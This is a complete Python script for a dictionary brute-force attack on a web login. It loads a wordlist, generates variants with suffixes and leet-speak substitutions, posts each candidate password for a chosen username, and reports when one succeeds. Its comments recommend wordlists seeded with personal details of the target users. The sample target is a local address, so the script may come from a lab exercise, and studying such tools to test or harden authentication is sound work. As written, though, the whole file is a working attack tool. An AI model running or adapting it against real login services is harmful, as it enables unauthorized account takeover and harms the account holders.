#!/usr/bin/env python3
"""
================================================================================
File:        dictionary_attack.py
Description: Dictionary-based brute-force attack with word mutations
             Uses wordlist with character substitutions and common suffixes
             to generate password candidates
Parameters:  --target <URL>, --user <username>, --list <wordlist_path>,
             --delay <float>
Author:      Erik Buser
Date:        2025-10-28
Note:        Wordlist should include common passwords AND personalized entries
             (names, emails, dates, combinations) for target users
================================================================================
"""

import argparse
import sys
import time
import requests


def load_wordlist(path):
    """Load wordlist from file (one word per line). Returns list of words."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {path}", file=sys.stderr)
        sys.exit(2)


def mutate_word(word):
    """Generate mutations of a word with common patterns.
    
    Returns list of candidates including:
      - Original word with suffixes ['', '1', '123', '!', '@', '2024', '2025']
      - Character substitutions (leet speak): o->0, a->@, i->1, e->3, s->$
      - Capitalization variants
    """
    candidates = []
    suffixes = ["", "1", "123", "!", "@", "2024", "2025"]
    
    # Add original word with suffixes
    for suffix in suffixes:
        candidates.append(word + suffix)
    
    # Apply leet speak character replacements
    mutated = word
    mutated = mutated.replace("o", "0").replace("O", "0")
    mutated = mutated.replace("a", "@").replace("A", "@")
    mutated = mutated.replace("i", "1").replace("I", "1")
    mutated = mutated.replace("e", "3").replace("E", "3")
    mutated = mutated.replace("s", "$").replace("S", "$")
    
    # Only add mutated variants if different from original
    if mutated != word:
        for suffix in suffixes:
            candidates.append(mutated + suffix)
    
    return candidates


def try_post(url, payload, timeout=5.0, max_retries=3):
    """POST JSON payload to url with retries. Returns response or None."""
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            return r
        except requests.RequestException as e:
            if attempt == max_retries:
                print(f"[!] Request failed after {attempt} attempts: {e}")
                return None
            else:
                time.sleep(backoff)
                backoff *= 2
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Dictionary-based brute-force tool with word mutations",
        epilog="""
Example:
  python dictionary_attack.py --target http://127.0.0.1:5000/login \\
    --user alice --list db/wordlists/common-passwords.txt
  
Note: 
  The wordlist should contain both common passwords AND personalized entries
  for your target users (names, email parts, dates, combinations).
        """
    )
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--list", required=True, help="Path to wordlist file (one word per line)")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay in seconds between attempts")
    args = parser.parse_args()

    words = load_wordlist(args.list)
    print("=" * 70)
    print("DICTIONARY ATTACK")
    print("=" * 70)
    print(f"[+] Loaded {len(words)} words from {args.list}")
    print()

    tried = 0
    start = time.time()

    try:
        for word in words:
            candidates = mutate_word(word)
            
            for candidate in candidates:
                payload = {"username": args.user, "password": candidate}
                r = try_post(args.target, payload)
                tried += 1

                if r is None:
                    print(f"[-] Request failed for candidate '{candidate}', skipping")
                else:
                    if r.status_code == 200:
                        elapsed = time.time() - start
                        print()
                        print("=" * 70)
                        print(f"SUCCESS! Password found: {candidate}")
                        print(f"Tried {tried} candidates in {elapsed:.1f}s")
                        print("=" * 70)
                        return 0
                    else:
                        if tried % 50 == 0:
                            elapsed = time.time() - start
                            print(f"[i] Tried {tried} candidates, last='{candidate}', elapsed={elapsed:.1f}s")

                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130

    elapsed = time.time() - start
    print()
    print("=" * 70)
    print(f"NOT FOUND: Tried {tried} candidates in {elapsed:.1f}s")
    print("=" * 70)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
